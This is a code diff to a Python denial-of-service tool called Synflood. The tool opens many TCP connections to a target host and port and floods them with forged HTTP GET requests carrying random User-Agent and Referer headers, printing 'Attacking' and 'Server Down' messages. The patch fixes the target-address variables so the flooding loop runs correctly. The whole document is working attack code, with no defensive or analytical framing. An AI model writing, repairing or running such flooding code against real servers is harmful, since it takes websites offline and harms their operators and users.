@@ -40,7 +40,7 @@ class Synflood:
         #tot = int(input('total packets: '))
         useragen = "User-Agent: " + random.choice(self.useragents) + "\r\n"
         accept = random.choice(self.acceptall)
-        reffer = "Referer: " + random.choice(self.ref) + str(ip) + "\r\n"
+        reffer = "Referer: " + random.choice(self.ref) + str(self.ip) + "\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\n"
         length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
         target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
@@ -48,12 +48,12 @@ class Synflood:
         for _ in range(self.packet):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((str(ip), int(port)))
+                s.connect((str(self.ip), int(self.port)))
                 s.send(str.encode(main_req))
                 for _ in range(self.pack):
                     s.send(str.encode(main_req))
                 xx += random.randint(0, int(self.packet))
-                print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+                print("[+] Attacking {0}:{1} | Sent: {2}".format(str(self.ip), int(self.port), xx))
             except:
                 s.close()
                 print('[+] Server Down.')
